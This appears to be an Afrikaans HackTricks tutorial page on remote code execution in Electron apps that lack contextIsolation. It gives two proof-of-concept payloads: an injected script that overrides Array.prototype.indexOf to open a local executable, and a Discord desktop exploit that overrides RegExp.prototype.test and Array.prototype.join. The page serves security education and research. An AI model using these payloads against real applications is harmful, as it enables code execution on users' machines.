# Elektron contextIsolation RCE via preload-kode

<details>

<summary><strong>Leer AWS-hacking van nul tot held met</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Ander maniere om HackTricks te ondersteun:

* As jy wil sien dat jou **maatskappy geadverteer word in HackTricks** of **HackTricks aflaai in PDF-formaat**, kyk na die [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Kry die [**amptelike PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Ontdek [**The PEASS Family**](https://opensea.io/collection/the-peass-family), ons versameling eksklusiewe [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Sluit aan by die** üí¨ [**Discord-groep**](https://discord.gg/hRep4RUj7f) of die [**telegram-groep**](https://t.me/peass) of **volg** ons op **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Deel jou hacking-truuks deur PR's in te dien by die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github-opslag.

</details>

## Voorbeeld 1

Voorbeeld vanaf [https://speakerdeck.com/masatokinugawa/electron-abusing-the-lack-of-context-isolation-curecon-en?slide=30](https://speakerdeck.com/masatokinugawa/electron-abusing-the-lack-of-context-isolation-curecon-en?slide=30)

Hierdie kode open http(s)-skakels met die verstekblaaier:

![](<../../../.gitbook/assets/image (375) (1) (1).png>)

Iets soos `file:///C:/Windows/systemd32/calc.exe` kan gebruik word om 'n sakrekenaar uit te voer, die `SAFE_PROTOCOLS.indexOf` voorkom dit.

Daarom kan 'n aanvaller hierdie JS-kode inspuit deur middel van XSS of willekeurige bladsynavigasie:
```html
<script>
Array.prototype.indexOf = function(){
return 1337;
}
</script>
```
Soos die oproep na `SAFE_PROTOCOLS.indexOf` altyd 1337 sal teruggee, kan die aanvaller die beskerming omseil en die rekenaar uitvoer. Finale aanval:
```html
<script>
Array.prototype.indexOf = function(){
return 1337;
}
</script>
<a href="file:///C:/Windows/systemd32/calc.exe">CLICK</a>
```
Kyk na die oorspronklike dia's vir ander maniere om programme uit te voer sonder om toestemming te vra.

Blykbaar is daar 'n ander manier om kode te laai en uit te voer deur iets soos `file://127.0.0.1/electron/rce.jar` te benader.

## Voorbeeld 2: Discord App RCE

Voorbeeld vanaf [https://mksben.l0.cm/2020/10/discord-desktop-rce.html?m=1](https://mksben.l0.cm/2020/10/discord-desktop-rce.html?m=1)

Toe ek die preload-skripte nagaan, het ek gevind dat Discord die funksie blootstel wat dit moontlik maak om sekere toegelate modules te roep deur middel van `DiscordNative.nativeModules.requireModule('MODULE-NAME')` in die webbladsy.\
Hier kon ek nie modules gebruik wat direk vir RCE gebruik kan word nie, soos die _child\_process_ module, maar ek **het 'n kode gevind waar RCE bereik kan word deur die oorskrywing van die ingeboude JavaScript-metodes** en die inmenging met die uitvoering van die blootgestelde module.

Die volgende is die PoC. Ek kon bevestig dat die **calc**-toepassing **verskyn** wanneer ek die `getGPUDriverVersions`-funksie roep wat in die module genaamd "_discord\_utils_" gedefinieer is vanaf devTools, terwyl ek **die `RegExp.prototype.test` en `Array.prototype.join` oorskryf**.
```javascript
RegExp.prototype.test=function(){
return false;
}
Array.prototype.join=function(){
return "calc";
}
DiscordNative.nativeModules.requireModule('discord_utils').getGPUDriverVersions();
```
Die `getGPUDriverVersions` funksie probeer om die program uit te voer deur die "_execa_" biblioteek te gebruik, soos die volgende:
```javascript
module.exports.getGPUDriverVersions = async () => {
if (process.platform !== 'win32') {
return {};
}

const result = {};
const nvidiaSmiPath = `${process.env['ProgramW6432']}/NVIDIA Corporation/NVSMI/nvidia-smi.exe`;

try {
result.nvidia = parseNvidiaSmiOutput(await execa(nvidiaSmiPath, []));
} catch (e) {
result.nvidia = {error: e.toString()};
}

return result;
};
```
Gewoonlik probeer die _execa_ om "_nvidia-smi.exe_" uit te voer, wat gespesifiseer word in die `nvidiaSmiPath` veranderlike, maar as gevolg van die oorskryf van `RegExp.prototype.test` en `Array.prototype.join`, **word die argument vervang deur "**_**calc**_**" in die interne verwerking van \_execa**\_**.

Spesifiek word die argument vervang deur die volgende twee dele te verander.

[https://github.com/moxystudio/node-cross-spawn/blob/16feb534e818668594fd530b113a028c0c06bddc/lib/parse.js#L36](https://github.com/moxystudio/node-cross-spawn/blob/16feb534e818668594fd530b113a028c0c06bddc/lib/parse.js#L36)

[https://github.com/moxystudio/node-cross-spawn/blob/16feb534e818668594fd530b113a028c0c06bddc/lib/parse.js#L55](https://github.com/moxystudio/node-cross-spawn/blob/16feb534e818668594fd530b113a028c0c06bddc/lib/parse.js#L55)

<details>

<summary><strong>Leer AWS-hacking van nul tot held met</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Ander maniere om HackTricks te ondersteun:

* As jy wil sien dat jou **maatskappy geadverteer word in HackTricks** of **HackTricks aflaai in PDF-formaat**, kyk na die [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Kry die [**amptelike PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Ontdek [**The PEASS Family**](https://opensea.io/collection/the-peass-family), ons versameling eksklusiewe [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Sluit aan by die** üí¨ [**Discord-groep**](https://discord.gg/hRep4RUj7f) of die [**telegram-groep**](https://t.me/peass) of **volg** ons op **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Deel jou haktruuks deur PR's in te dien by die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github-opslag.

</details>
